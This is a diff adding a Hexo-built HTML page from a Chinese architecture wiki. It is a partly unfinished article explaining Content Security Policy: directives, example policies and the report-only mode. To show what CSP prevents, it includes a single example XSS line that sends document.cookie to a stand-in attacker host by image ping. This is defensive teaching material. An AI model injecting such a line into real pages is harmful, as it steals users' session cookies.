@@ -1,0 +1,419 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>CSP 浏览器内存安全策略 | 架构师知识系统</title>
+  <meta name="author" content="少个分号">
+  
+  <meta name="description" content="什么是CSP?这里一段定义是来自于MDN社区
+
+Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, includ">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="CSP 浏览器内存安全策略">
+  <meta property="og:site_name" content="架构师知识系统">
+
+  
+    <meta property="og:image" content="undefined">
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="架构师知识系统" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">  
+  <link rel="stylesheet" href="/css/sidenav.css" media="screen" type="text/css">  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+</head>
+</html>
+<body id="body" data-spy="scroll" data-target=".toc">
+  <div class="container" id="container">
+	<div class="content">
+	  <div class="page-header">		
+  <h1><a class="brand" href="/">架构师知识系统</a><span class="split"></span><span class="title">CSP 浏览器内存安全策略</span><span class="date" id="title-date"><i class="fa fa-clock-o"></i> 2018-11-29</span></h1>
+</div>		
+
+<div class="row page">
+  <!-- cols -->	
+  
+  <div class="col-xs-12 col-sm-3 col-md-3 toc"> 
+	<!-- toc -->
+<script type="text/javascript">
+		jQuery(document).ready(function() {
+ 		   generateWikiTOC('.note', '.toc',  2 , 2 );
+		});
+</script>
+  </div><!-- col-md-3 -->
+  
+  
+
+  
+  <div class="col-xs-12 col-sm-9 col-md-9 note">
+	
+
+	  <!-- content -->
+	  <h2 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP?"></a>什么是CSP?</h2><p>这里一段定义是来自于MDN社区</p>
+<blockquote>
+<p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware.</p>
+</blockquote>
+<p>内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。</p>
+<p>参考来源</p>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></p>
+<h2 id="使用CSP的两种方式"><a href="#使用CSP的两种方式" class="headerlink" title="使用CSP的两种方式"></a>使用CSP的两种方式</h2><ul>
+<li>通过服务器 HTTP 头部的 Content-Security-Policy 来指定</li>
+<li><p>通过 HTML 文档的 meta 标签配置策略</p>
+<p>例如：</p>
+<p>使用 HTTP 头部，这里的 policy 为策略字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: policy</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>使用 HTML meta 标签的方式</p>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; img-src https://*; child-src 'none';"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="主要防范目标"><a href="#主要防范目标" class="headerlink" title="主要防范目标"></a>主要防范目标</h2><p> CSP主要是防范 XSS 攻击，以及报告 XSS 攻击，如果页面存在漏洞让 JS 脚本注入，CSP 能限制脚本的运行，然后把损失降到最小</p>
+ <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+<p> CSP 是通过限制加载到页面上的资源、域或者协议来实现的，例如，一旦入侵者找到漏洞注入了XSS攻击，入侵者可以通过 图片Ping的方式发送敏感信息到外部网站。CSP 可以指定允许信任域名下的图片、Script和样式表被加载到页面上，及时入侵者 XSS 入侵成功也无法通过这些方式发送数据，保证网站一定程度上安全。</p>
+<p> TODO 几个例子限制加载的资源</p>
+<p>另外 CSP 也提供了只允许加载指定协议，例如HTTPS的资源，否则自动跳转到 HTTPS 版本。</p>
+<h2 id="使用-CSP"><a href="#使用-CSP" class="headerlink" title="使用 CSP"></a>使用 CSP</h2><p>当我们需要使用CSP生效就需要编写相应的策略，策略包括一系列指令组成和设置定的值组成。</p>
+<p>例如，一个网站管理者允许内容来自信任的域名及其子域名 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; *.trusted.com</span><br></pre></td></tr></table></figure>
+<p>我们再看一条策略：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</span><br></pre></td></tr></table></figure>
+<p>这条策略有4个指令 img-src 为图片资源，media-src 为视频媒体资源，script-src 为脚本资源。最重要的一个是 default-src 为所有的资源默认属性，这里设置为了 ‘self’ 的含义为所有的资源再不指定的情况下只能从自身域下加载。</p>
+<p>TODO 描述 行内脚本</p>
+<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><host-source></host-source></p>
+<p><scheme-source><br>    self<br>    unsafe-inline<br>    unsafe-eva<br>    none<br>    nonce-&lt;base64值&gt;<br>    strict-dynamic</scheme-source></p>
+<p>### </p>
+<p> TODO 讲解这几种模式</p>
+<h2 id="报告违规情况"><a href="#报告违规情况" class="headerlink" title="报告违规情况"></a>报告违规情况</h2><p>CSP 提供了另外一个非常有用的模式 - 报告模式，如果在 HTTP 头部指定 Content-Security-Policy-Report-Only 可以将发生了任何违规的事件都会被报告出去，但是这个头部只会对报告生效，实际生效还是需要 在Content-Security-Policy 中指定。</p>
+<p>在报告的策略中需要配置一个 report-uri 用于服务器接受违规报告情况，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Content-Security-Policy: default-src &apos;self&apos;; report-uri http://reportcollector.example.com/collector.cgi</span><br></pre></td></tr></table></figure>
+<p>浏览器会向 report-uri 中指定的地址使用 POST 发送一个 JSON 格式的数据包。</p>
+<p>数据包格式如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"csp-report"</span>: &#123;</span><br><span class="line">    <span class="attr">"document-uri"</span>: <span class="string">"http://example.com/signup.html"</span>,</span><br><span class="line">    <span class="attr">"referrer"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"blocked-uri"</span>: <span class="string">"http://example.com/css/style.css"</span>,</span><br><span class="line">    <span class="attr">"violated-directive"</span>: <span class="string">"style-src cdn.example.com"</span>,</span><br><span class="line">    <span class="attr">"original-policy"</span>: <span class="string">"default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+	  
+
+	  <div>
+  		<center>
+		  <div class="pagination">
+<ul class="pagination">
+	
+	
+	
+	
+	
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+			
+		
+	
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+			
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+	
+	
+		<li class="prev"><a href="/安全/security/security-management/" class="alignleft prev"><i class="fa fa-arrow-circle-o-left"></i>prev</a></li>
+	
+	<li><a href="/"><i class="fa fa-archive"></i>Home</a></li>
+	
+		<li class="next disabled"><a>next<i class="fa fa-arrow-circle-o-right"></i></a></li>
+	
+</ul>
+</div>
+
+		</center>
+	  </div>
+	  
+	</div> <!-- col-md-9/col-md-12 -->
+	
+  </div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+	<footer> <p>
+  
+  &copy; 2019 少个分号
+  
+  <a href="/about" target="_blank">关于本站</a> |
+  <a href="https://github.com/linksgo2011/wiki" target="_blank">github |</a>
+  <a href="http://www.printf.cn" target="_blank">我的博客</a>
+</p> </footer>
+  </div> <!-- container-narrow -->
+  
+<a id="gotop" href="#">   
+  <span>▲</span> 
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/jquery.tableofcontents.min.js"></script>
+<script src="/js/tocgenerator.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+
+</body>
+</html>
